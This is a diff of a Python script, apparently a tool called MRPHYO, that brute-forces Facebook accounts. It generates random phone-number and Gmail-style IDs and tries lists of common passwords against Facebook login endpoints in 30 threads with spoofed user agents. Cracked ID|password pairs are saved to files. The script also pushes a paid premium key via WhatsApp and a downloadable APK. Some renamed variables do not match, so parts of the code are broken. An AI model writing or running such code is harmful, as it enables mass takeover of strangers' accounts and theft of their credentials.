@@ -14,7 +14,7 @@ try:
 except ModuleNotFoundError:
         print('\n Installing missing modules ...')
         os.system('pip install requests futures==2 > /dev/null')
-        os.system('python Mr-Phyo.py')
+        os.system('python MRPHYO.py')
 except:pass
         
 fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
@@ -47,25 +47,25 @@ for agent in range(10000):
         l='Mobile Safari/533.1'
         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
         ugen.append(fullagnt)
-logo=("""\033[1;32m
+logo=("""\033[1;37m
  
-
-\033[1;37m  __  __ _____    _____  _    ___     ______  
-\033[1;37m |  \/  |  __ \  |  __ \| |  | \ \   / / __ \ 
-\033[1;32m | \  / | |__) | | |__) | |__| |\ \_/ / |  | |
-\033[1;32m | |\/| |  _  /  |  ___/|  __  | \   /| |  | |
-\033[1;36m | |  | | | \ \ _| |    | |  | |  | | | |__| |
-\033[1;36m |_|  |_|_|  \_(_)_|    |_|  |_|  |_|  \____/ 
-                    
-    [♥] Hello Myanmar [♥]                 
+\033[1;32m  __  __ _____  _____  _    ___     ______  
+\033[1;32m |  \/  |  __ \|  __ \| |  | \ \   / / __ \ 
+\033[1;35m | \  / | |__) | |__) | |__| |\ \_/ / |  | |
+\033[1;35m | |\/| |  _  /|  ___/|  __  | \   /| |  | |
+\033[1;36m | |  | | | \ \| |    | |  | |  | | | |__| |
+\033[1;36m |_|  |_|_|  \_\_|    |_|  |_|  |_|  \____/ 
+                                            
+                                            
+{♥} Hello Myanmar {❤}
 ----------------------------------------------
-{√} Author    :\033[1;32m WAI Linn Khaing 
-{√} Tool Name :\033[1;32m MR.PHYO 
-{√} Type type :\033[1;32m PAID
-{√} Version   :\033[1;32m 0.0.1
-\033[1;32m----------------------------------------------""")
+{√} Author    :\033[1;31m WAI LINN KHAING
+{√} Tool Name :\033[1;31m MRPHYO
+{√} Type type :\033[1;31m Free
+{√} Version   :\033[1;31m 0.0.1
+\033[1;37m----------------------------------------------""")
 def linex():
-        print('\033[1;32m----------------------------------------------')
+        print('\033[1;37m----------------------------------------------')
 def clear():
         os.system('clear')
         print(logo)
@@ -148,7 +148,7 @@ def public():
         linex()
         print(' Do you went show cp account? (y/n): ')
         linex()
-        cx=input(' \033[1;32mChoose: ')
+        cx=input(' Choose: ')
         if cx in ['y','Y','yes','Yes','1']:
                 pcp.append('y')
         else:
@@ -202,7 +202,7 @@ def public():
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python Mr-Phyo.py')
+                os.system('python MRPHYO.py')
         except requests.exceptions.ConnectionError:
                 exit(f' No internet connection')
         except (KeyError,IOError):
@@ -275,7 +275,7 @@ def menu():
                                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                 linex()
                                 input(' Press enter to back ')
-                                os.system('python Mr-Phyo.py')
+                                os.system('python MRPHYO.py')
                         elif xd in ['2','02']:
                                 import dump
                                 dump.Main()
@@ -300,7 +300,7 @@ def menu():
                                 wx=('Dsj9JMWoixk4Qsje0Ng3nA')
                                 os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
                         elif xd in ['7','07']:
-                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/Mr-Phyo_VPN1.0.apk/file');menu()
+                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/MRPHYO_VPN1.0.apk/file');menu()
                         elif xd in ['8','08']:
                                 os.system('xdg-open https://www.facebook.com/100084680097792/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
                         elif xd in ['0','00']:
@@ -324,9 +324,9 @@ def menu():
                         url_wa = "https://api.whatsapp.com/send?phone=+923150665740&text="
                         name = input(" Enter your Name : ")
                         linex()
-                        tks = ("Hi Mr-Phyo Sir, I Need To Buy Your Paid Mr-Phyo PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
+                        tks = ("Hi MRPHYO Sir, I Need To Buy Your Paid MRPHYO PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                         subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
-                        print(' Run :  python Mr-Phyo.py')
+                        print(' Run :  python MRPHYO.py')
                         exit()
         except ValueError:
                 exit()
@@ -345,7 +345,7 @@ def pak():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(7))
                         user.append(nmp)
-                with tred(max_workers=30) as Mr-Phyo:     
+                with tred(max_workers=30) as Crazy:     
                         clear()
                         tl = str(len(user))
                         print(' Total account : \033[1;32m'+tl)
@@ -355,14 +355,14 @@ def pak():
                         for psx in user:
                                 ids = code+psx
                                 passlist = [psx,ids,'khankhan','khan1122','khan12345','khan1234','khan12','khan786','khan123','khan123456','khankhan123','786786']
-                                Mr-Phyo.submit(rndm,ids,passlist)
+                                MRPHYO.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python Mr-Phyo.py')
+                os.system('python MRPHYO.py')
 def bd():
                 user=[]
                 clear()
@@ -375,7 +375,7 @@ def bd():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(8))
                         user.append(nmp)
-                with tred(max_workers=30) as Mr-Phyo:     
+                with tred(max_workers=30) as Crazy:     
                         clear()
                         tl = str(len(user))
                         print(' Total account : \033[1;32m'+tl)
@@ -385,14 +385,14 @@ def bd():
                         for psx in user:
                                 ids = code+psx
                                 passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
-                                Mr-Phyo.submit(rndm,ids,passlist)
+                                Crazy.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python Mr-Phyo.py')
+                os.system('python MRPHYO.py')
 def gmail():
                 os.system('rm -rf .re.txt')
                 clear()
@@ -424,7 +424,7 @@ def gmail():
                                 mail = ''.join(random.choice(string.digits) for _ in range(4))
                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                         fo = open('.re.txt', 'r').read().splitlines()
-                with tred(max_workers=30) as Mr-Phyo:
+                with tred(max_workers=30) as Crazy:
                         total = str(len(fo))
                         clear()
                         print(' Total account : \033[1;32m'+total)
@@ -439,18 +439,18 @@ def gmail():
                                         last_name = 'Khan'
                                 fs = first_name.lower()
                                 ls = last_name.lower()
-                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'1234',Fs+'112345',FSs,FS+'1234',FSs+'123',fs+'12']
-                                Mr.submit(rndm,ids,passlist)
+                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
+                                Crazy.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python Mr-Phyo.py')
+                os.system('python MRPHYO.py')
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;37m [Mr-Phyo] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [MRPHYO] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -467,18 +467,18 @@ def ffb(ids,names,passlist):
                         getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-                        Mr-Phyo=session.cookies.get_dict().keys()
-                        if "c_user" in Mr-Phyo:
+                        Crazy=session.cookies.get_dict().keys()
+                        if "c_user" in Crazy:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print('\r\r\033[1;32m [Mr-Phyo-OK] %s | %s'%(ids,pas))
-                                open('/sdcard/Mr-Phyo-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                print('\r\r\033[1;32m [MRPHYO-OK] %s | %s'%(ids,pas))
+                                open('/sdcard/MRPHYO-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
-                        elif 'checkpoint' in Mr-Phyo:
+                        elif 'checkpoint' in Crazy:
                                 if 'y' in pcp:
-                                        print('\r\r\x1b[38;5;208m [Mr-Phyo-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/Mr-Phyo-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;208m [MRPHYO-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/MRPHYO-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -492,7 +492,7 @@ xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT
 def api(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [Mr-Phyo] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [MRPHYO] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -542,14 +542,14 @@ def api(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m [Mr-Phyo-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/Mr-Phyo-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [MRPHYO-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/MRPHYO-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [Mr-Phyo-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/Mr-Phyo-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;206m [MRPHYO-CP] '+ids+' | '+pas+'\033[1;94m')
+                                                open('/sdcard/MRPHYO-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                 else:
@@ -562,7 +562,7 @@ def api(ids,names,passlist):
 def api1(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [Mr-Phyo] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [MRPHYO] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -612,18 +612,18 @@ def api1(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m [Mr-Phyo-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/Mr-Phyo-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [MRPHYO-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/MRPHYO-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [Mr-Phyo-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/Mr-Phyo-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;208m [MRPHYO-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/MRPHYO-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open('/sdcard/Mr-Phyo-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/MRPHYO-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
@@ -635,7 +635,7 @@ def api1(ids,names,passlist):
 def rndm(ids,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [Mr-Phyo] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [MRPHYO] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         for pas in passlist:
                                 application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                 application_version_code=str(random.randint(000000000,999999999))
@@ -681,16 +681,16 @@ def rndm(ids,passlist):
                                 if 'session_key' in q:
                                         uid=str(q['uid'])
                                         try:
-                                                okk=open('/sdcard/Mr-Phyo-OK.txt','r').read()
+                                                okk=open('/sdcard/MRPHYO-OK.txt','r').read()
                                                 if uid in okk:pass
                                                 else:
-                                                        print('\r\r\033[1;32m [Mr-Phyo-OK] '+uid+' | '+pas+'\033[1;97m')
-                                                        open('/sdcard/Mr-Phyo-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                        print('\r\r\033[1;32m [MRPHYO-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                        open('/sdcard/MRPHYO-OK.txt','a').write(uid+'|'+pas+'\n')
                                                         oks.append(ids)
                                                         break
                                         except:
-                                                print('\r\r\033[1;32m [Mr-Phyo-OK] '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/Mr-Phyo-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                print('\r\r\033[1;32m [MRPHYO-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/MRPHYO-OK.txt','a').write(uid+'|'+pas+'\n')
                                                 oks.append(ids)
                                                 break
                                 else:
